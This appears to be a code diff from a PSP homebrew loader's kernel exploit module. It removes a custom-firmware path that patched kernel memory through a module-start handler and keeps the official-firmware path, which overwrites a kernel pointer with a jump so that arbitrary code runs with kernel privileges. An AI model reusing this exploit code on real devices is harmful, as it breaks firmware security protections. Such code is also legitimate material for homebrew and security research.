@@ -25,8 +25,6 @@ Made to work on OFW and CFW.
 #include "functions.h"
 #include "kxploit.h"
 
-#include "libs/libsploit/scanner.c"
-
 #define LIBC_CLOCK_OFFSET_660  0x88014400
 #define LIBC_CLOCK_OFFSET_360  0x88014D80
 #define LIBC_CLOCK_OFFSET_365  0x88014D00
@@ -39,9 +37,7 @@ UserFunctions* g_tbl = NULL;
 static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
 static u32 jump_ptr = 0;
 void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);
-void* (*set_start_module_handler)(void*) = NULL;
-int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;
-void (*prev)(void*) = NULL;
+
 u32 patch_instr = 0;
 u32 patch_addr = 0;
 
@@ -101,22 +97,6 @@ u32 readKram(u32 addr) {
 	return res;
 }
 
-// on CFW, we can setup a custom function to handle module loading, this function executes with kernel priviledges
-void my_mod_handler(void* mod){
-
-    // corrupt kernel, simulates typical NOP in sceKernelLibcTime so we can pass a second argument
-    u32 libctime = (void*)FindFunction("sceSystemMemoryManager", "UtilsForUser", 0x27CC57F0);
-    patch_addr = libctime + 4;
-    patch_instr = _lw(patch_addr);
-    _sw(NOP, patch_addr);
-
-    // fallback to previous handler
-    if (prev){
-        prev(mod);
-    }
-    set_start_module_handler(prev);
-}
-
 // restore corrupted kernel memory
 void repairInstruction(KernelFunctions* k_tbl) {
   if (patch_addr && patch_instr){
@@ -135,10 +115,6 @@ int stubScanner(UserFunctions* tbl){
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
 	  _sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);
 
-    // weak import in ARK Loader, we later check if it's actually available
-    set_start_module_handler = tbl->FindImportUserRam("SystemCtrlForUser", 0x1C90BECB);
-    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);
-
     return (_sceNetMCopyback_1560F143==NULL);
 }
 
@@ -149,23 +125,10 @@ int doExploit(void) {
 
     int res;
     u32 seed = 0;
-    prev = NULL;
     patch_addr = 0;
     patch_instr = 0;
 
-    // CFW check
-    if (set_start_module_handler){
-      // check if the sctrlHENSetStartModuleHandler (CFW-only) import has been properly linked
-      u16 start_module_syscall = _lh((u32)set_start_module_handler+6);
-      if (start_module_syscall && start_module_syscall != 0x2402){
-        PRTSTR("CFW detected");
-        prev = set_start_module_handler(my_mod_handler); // register our custom handler
-        g_tbl->UtilityLoadModule(PSP_MODULE_NP_DRM); // trigger StartModule handler
-        g_tbl->UtilityUnloadModule(PSP_MODULE_NP_DRM); // not really needed but whatever
-        return (patch_addr == 0 || patch_instr == 0);
-      }
-    }
-    // OFW then
+    // use read-only exploit to figure out things
     if (_sceNetMCopyback_1560F143 != NULL){
       // not the most robust, but it works
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
@@ -232,17 +195,11 @@ int doExploit(void) {
 }
 
 void executeKernel(u32 kernelContentFunction){
-  if (prev){ // CFW
-    // can pass second argument to sceKernelLibcTime
-    _sceKernelLibcTime(0x08800000, KERNELIFY(kernelContentFunction));
-  }
-  else { // OFW
-    // Make a jump to kernel function
-    _sw(JUMP(KERNELIFY(kernelContentFunction)), jump_ptr);
-    _sw(NOP, jump_ptr+4);
-    g_tbl->KernelDcacheWritebackAll();
+  // Make a jump to kernel function
+  _sw(JUMP(KERNELIFY(kernelContentFunction)), jump_ptr);
+  _sw(NOP, jump_ptr+4);
+  g_tbl->KernelDcacheWritebackAll();
 
-    // Execute kernel function
-    g_tbl->KernelLibcClock();
-  }
+  // Execute kernel function
+  g_tbl->KernelLibcClock();
 }
